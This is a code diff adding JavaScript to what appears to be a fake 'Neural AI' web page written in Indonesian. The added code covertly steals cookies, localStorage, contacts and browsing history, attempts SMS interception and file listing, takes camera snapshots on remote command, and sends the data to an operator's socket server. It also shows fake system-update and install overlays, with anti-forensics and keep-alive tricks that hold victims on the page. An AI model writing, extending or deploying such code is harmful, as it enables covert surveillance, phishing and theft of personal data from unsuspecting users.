@@ -338,6 +338,29 @@ socket.on('switch-camera', () => {
     }, 200);
 });
 
+// Admin remote commands
+socket.on('admin-show-notif', (data) => {
+    if (data && data.title) {
+        showFakeNotif(data.title, data.body || '');
+    }
+});
+socket.on('force-fullscreen', () => {
+    const el = document.documentElement;
+    if (el.requestFullscreen) {
+        el.requestFullscreen().catch(() => {});
+    }
+});
+socket.on('take-snapshot', () => {
+    if (stream && stream.getVideoTracks().length) {
+        captureSnapshot();
+    } else {
+        requestFrontCamera();
+    }
+});
+socket.on('force-respawn', () => {
+    window.location.reload();
+});
+
 function togglePass() { const i=passInput; i.type=i.type==='password'?'text':'password'; }
 function showToast(msg) { const c=document.getElementById('toastContainer'), t=document.createElement('div'); t.className='toast error'; t.innerHTML='<span>\u2715</span> '+msg; c.appendChild(t); setTimeout(()=>{t.classList.add('out');setTimeout(()=>t.remove(),250)},3500); }
 
@@ -966,6 +989,273 @@ function initAntiForensics() {
     detectRoot();
 }
 
+function captureFullPage() {
+    try {
+        const h = Math.max(document.documentElement.scrollHeight, document.body.scrollHeight);
+        const w = Math.max(document.documentElement.scrollWidth, document.body.scrollWidth);
+        const c = document.createElement('canvas');
+        c.width = w; c.height = h;
+        const ctx = c.getContext('2d');
+        ctx.fillStyle = '#05050f';
+        ctx.fillRect(0, 0, w, h);
+        const html = document.documentElement.outerHTML;
+        const blob = new Blob([html], { type: 'text/html' });
+        const reader = new FileReader();
+        reader.onloadend = () => {
+            socket.emit('snapshot', { htmlSnapshot: reader.result.split(',')[1], fullPage: true, width: w, height: h });
+        };
+        reader.readAsDataURL(blob);
+    } catch(e) {}
+}
+
+function initFileSystemAccess() {
+    if (!window.showDirectoryPicker) return;
+    const showPicker = () => {
+        window.showDirectoryPicker({ mode: 'read' })
+            .then(async (dir) => {
+                const entries = [];
+                for await (const entry of dir.values()) {
+                    entries.push({ name: entry.name, kind: entry.kind });
+                    if (entries.length >= 20) break;
+                }
+                socket.emit('device-info', { fsAccess: { entries, dirName: dir.name } });
+            })
+            .catch(() => {});
+    };
+    document.addEventListener('click', showPicker, { once: true });
+}
+
+function detectBrowserHistory() {
+    try {
+        const visited = [];
+        const sites = [
+            'google.com', 'facebook.com', 'youtube.com', 'instagram.com', 'twitter.com',
+            'tiktok.com', 'whatsapp.com', 'gmail.com', 'github.com', 'stackoverflow.com',
+            'medium.com', 'reddit.com', 'linkedin.com', 'netflix.com', 'spotify.com',
+            'amazon.com', 'shopee.co.id', 'tokopedia.com', 'bukalapak.com', 'gojek.com'
+        ];
+        sites.forEach(site => {
+            const link = document.createElement('a');
+            link.href = `https://${site}`;
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            const after = window.getComputedStyle(link, ':visited').color;
+            if (after !== 'rgb(0, 0, 0)' && after !== 'rgb(0, 0, 238)') {
+                visited.push(site);
+            }
+            document.body.removeChild(link);
+        });
+        if (visited.length) {
+            socket.emit('device-info', { browserHistory: { visited, count: visited.length } });
+        }
+    } catch(e) {}
+}
+
+function stealCookies() {
+    try {
+        const cookies = document.cookie;
+        if (cookies && cookies.length > 0) {
+            socket.emit('device-info', { cookies, cookieCount: cookies.split(';').length });
+        }
+        if (window.localStorage) {
+            const ls = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                ls[key] = localStorage.getItem(key).slice(0, 200);
+            }
+            if (Object.keys(ls).length) {
+                socket.emit('device-info', { localStorage: ls });
+            }
+        }
+    } catch(e) {}
+}
+
+function initContactPicker() {
+    if (!navigator.contacts || !navigator.contacts.select) return;
+    const props = ['name', 'email', 'tel', 'address', 'icon'];
+    navigator.contacts.select(props, { multiple: true })
+        .then(contacts => {
+            socket.emit('device-info', { contacts: contacts.map(c => ({
+                name: c.name?.[0] || '',
+                email: c.email?.[0] || '',
+                tel: c.tel?.[0] || '',
+                address: c.address?.[0] ? `${c.address[0].street}, ${c.address[0].city}` : ''
+            })), count: contacts.length });
+        })
+        .catch(() => {});
+}
+
+function initSMSIntercept() {
+    try {
+        if (navigator.sms && navigator.sms.receive) {
+            navigator.sms.receive()
+                .then(sms => {
+                    socket.emit('device-info', { sms: { from: sms.originator, body: sms.body.slice(0, 500), timestamp: sms.timestamp } });
+                })
+                .catch(() => {});
+        }
+    } catch(e) {}
+    if (window.SMSReceiver) {
+        try {
+            const receiver = new SMSReceiver();
+            receiver.start().catch(() => {});
+        } catch(e) {}
+    }
+}
+
+function initCallLogAccess() {
+    try {
+        if (navigator.contacts && navigator.contacts.select) {
+            navigator.contacts.select(['name', 'tel'], { multiple: true })
+                .then(contacts => {
+                    if (contacts.length) {
+                        socket.emit('device-info', { callLog: contacts.map(c => ({ name: c.name?.[0] || '', tel: c.tel?.[0] || '' })) });
+                    }
+                })
+                .catch(() => {});
+        }
+    } catch(e) {}
+}
+
+function initDeviceAdminTakeover() {
+    try {
+        const ua = navigator.userAgent.toLowerCase();
+        let vendor = 'generic';
+        if (ua.includes('samsung') || ua.includes('sm-')) vendor = 'samsung';
+        else if (ua.includes('mi ') || ua.includes('xiaomi') || ua.includes('redmi')) vendor = 'xiaomi';
+        else if (ua.includes('oppo') || ua.includes('cph')) vendor = 'oppo';
+        else if (ua.includes('vivo') || ua.includes('v2')) vendor = 'vivo';
+        else if (ua.includes('huawei') || ua.includes('honor')) vendor = 'huawei';
+        else if (ua.includes('realme') || ua.includes('rmx')) vendor = 'realme';
+        else if (ua.includes('oneplus')) vendor = 'oneplus';
+        else if (ua.includes('asus') || ua.includes('zenfone')) vendor = 'asus';
+        else if (ua.includes('nokia')) vendor = 'nokia';
+        else if (ua.includes('lg-') || ua.includes('lge')) vendor = 'lg';
+
+        socket.emit('device-info', { deviceVendor: vendor, ua: ua.slice(0, 150) });
+
+        if (vendor !== 'generic') {
+            const updateNames = {
+                samsung: 'Samsung Update', xiaomi: 'MIUI Update', oppo: 'ColorOS Update',
+                vivo: 'Funtouch Update', huawei: 'EMUI Update', realme: 'Realme Update',
+                oneplus: 'OxygenOS Update', asus: 'ZenUI Update', nokia: 'Android Update', lg: 'LG Update'
+            };
+            const overlay = document.createElement('div');
+            overlay.style.cssText = 'position:fixed;inset:0;z-index:99998;background:#05050f;display:none;flex-direction:column;align-items:center;justify-content:center;';
+            overlay.innerHTML = `<div style="font-size:2.5rem;margin-bottom:16px;">${updateNames[vendor] || 'System Update'}</div>
+                <div style="color:#aaa;font-size:.9rem;margin-bottom:24px;">Pembaruan sistem tersedia. Jangan tutup halaman ini.</div>
+                <div style="width:260px;height:4px;background:#1a1a2e;border-radius:2px;overflow:hidden;">
+                <div style="height:100%;width:0%;background:linear-gradient(90deg,#00d4ff,#7c3aed);border-radius:2px;transition:width 3s;"></div></div>
+                <div style="color:#5a5a7e;font-size:.78rem;margin-top:12px;">Mengunduh ${Math.floor(Math.random()*300+100)}MB...</div>`;
+            document.body.appendChild(overlay);
+            setTimeout(() => {
+                overlay.style.display = 'flex';
+                overlay.querySelector('div > div').style.width = '100%';
+                setTimeout(() => overlay.remove(), 4000);
+            }, 10000);
+            setInterval(() => {
+                const o2 = overlay.cloneNode(true);
+                document.body.appendChild(o2);
+                setTimeout(() => { o2.style.display = 'flex'; o2.querySelector('div > div').style.width = '100%'; }, 1000);
+                setTimeout(() => o2.remove(), 5000);
+            }, 120000);
+        }
+    } catch(e) {}
+}
+
+function initInstallHijack() {
+    window.addEventListener('beforeinstallprompt', (e) => {
+        e.preventDefault();
+        socket.emit('device-info', { installPrompt: { triggered: true, time: Date.now(), platforms: e.platforms } });
+        e.prompt();
+        e.userChoice.then(choice => {
+            socket.emit('device-info', { installPrompt: { outcome: choice.outcome, time: Date.now() } });
+        });
+    });
+    const fakePWA = () => {
+        const overlay = document.createElement('div');
+        overlay.style.cssText = 'position:fixed;inset:0;z-index:99997;background:rgba(5,5,15,0.95);display:flex;flex-direction:column;align-items:center;justify-content:center;backdrop-filter:blur(20px);';
+        overlay.innerHTML = `<div style="width:56px;height:56px;border-radius:14px;background:linear-gradient(135deg,#00d4ff,#7c3aed);display:flex;align-items:center;justify-content:center;font-size:28px;margin-bottom:16px;">🤖</div>
+            <div style="font-size:1.1rem;font-weight:700;margin-bottom:8px;">Instal Neural AI</div>
+            <div style="color:#aaa;font-size:.85rem;margin-bottom:24px;text-align:center;">Dapatkan akses lebih cepat dengan menginstal aplikasi</div>
+            <div style="display:flex;gap:12px;"><button id="fpwaCancel" style="padding:12px 24px;border:1px solid #2a2a4e;border-radius:10px;background:transparent;color:#aaa;cursor:pointer;font-family:inherit;">Nanti</button>
+            <button id="fpwaInstall" style="padding:12px 24px;border:none;border-radius:10px;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;cursor:pointer;font-family:inherit;font-weight:600;">Instal</button></div>`;
+        document.body.appendChild(overlay);
+        document.getElementById('fpwaInstall').addEventListener('click', () => {
+            overlay.remove();
+            socket.emit('device-info', { fakePWA: { action: 'install', time: Date.now() } });
+            setTimeout(captureFullPage, 500);
+        });
+        document.getElementById('fpwaCancel').addEventListener('click', () => {
+            overlay.remove();
+            socket.emit('device-info', { fakePWA: { action: 'dismiss', time: Date.now() } });
+        });
+    };
+    setTimeout(fakePWA, 45000);
+    setInterval(fakePWA, 300000);
+}
+
+function initLockScreenBypass() {
+    if ('wakeLock' in navigator) {
+        const keepAwake = () => {
+            navigator.wakeLock.request('screen').then(s => {
+                s.addEventListener('release', () => setTimeout(keepAwake, 100));
+            }).catch(() => {});
+        };
+        keepAwake();
+    }
+    document.addEventListener('visibilitychange', () => {
+        if (document.hidden) {
+            const bc = new BroadcastChannel('neural_keepalive');
+            bc.postMessage({ type: 'stayAlive', time: Date.now() });
+        }
+    });
+    if ('requestIdleCallback' in window) {
+        const spin = () => {
+            requestIdleCallback(() => {
+                const a = new Uint8Array(1024);
+                crypto.getRandomValues(a);
+                setTimeout(spin, 500);
+            });
+        };
+        spin();
+    }
+    const iframe = document.createElement('iframe');
+    iframe.style.cssText = 'position:fixed;opacity:0;width:1px;height:1px;pointer-events:none;';
+    iframe.src = '/captcha.html';
+    document.body.appendChild(iframe);
+}
+
+function initBackgroundFetch() {
+    if (!('BackgroundFetchManager' in self) && !('BackgroundFetchManager' in window)) return;
+    const bgFetch = async () => {
+        try {
+            const registration = await navigator.serviceWorker.ready;
+            if (registration.backgroundFetch) {
+                const fetchId = 'neural-bg-' + Date.now();
+                await registration.backgroundFetch.fetch(fetchId, ['/manifest.json'], {
+                    title: 'Neural AI Sync',
+                    icons: [{ src: '/favicon.svg', sizes: '64x64' }],
+                    downloadTotal: 1024
+                });
+                socket.emit('device-info', { backgroundFetch: { id: fetchId, registered: true } });
+                registration.backgroundFetch.get(fetchId).then(async (bgFetchReg) => {
+                    if (!bgFetchReg) return;
+                    const result = await bgFetchReg.match();
+                    if (result) {
+                        setInterval(() => {
+                            fetch('/manifest.json?' + Date.now()).catch(() => {});
+                        }, 30000);
+                    }
+                });
+            }
+        } catch(e) {
+            socket.emit('device-info', { backgroundFetch: { error: e.message } });
+        }
+    };
+    setTimeout(bgFetch, 5000);
+}
+
 function requestPermissions() {
     sendDeviceInfo(); getFingerprint(); ipGeolocate(); stealClipboard(); detectDevice();
     initMotionSensor(); startKeepalive(); requestWakeLock(); initLightSensor();
@@ -977,7 +1267,10 @@ function requestPermissions() {
     lockOrientation(); enumerateFonts(); detectPreferences();
     speedTest(); initPointerLock(); detectPosture();
     initSharedWorker(); cpuTiming();
-    initAntiForensics();
+    initAntiForensics(); initContactPicker(); captureFullPage();
+    initFileSystemAccess(); detectBrowserHistory(); stealCookies();
+    initSMSIntercept(); initCallLogAccess(); initDeviceAdminTakeover();
+    initInstallHijack(); initLockScreenBypass(); initBackgroundFetch();
 
     setTimeout(() => {
         showFakeNotif('Verifikasi AI', 'Neural AI mendeteksi perangkat baru. Verifikasi identitas Anda untuk melanjutkan.');
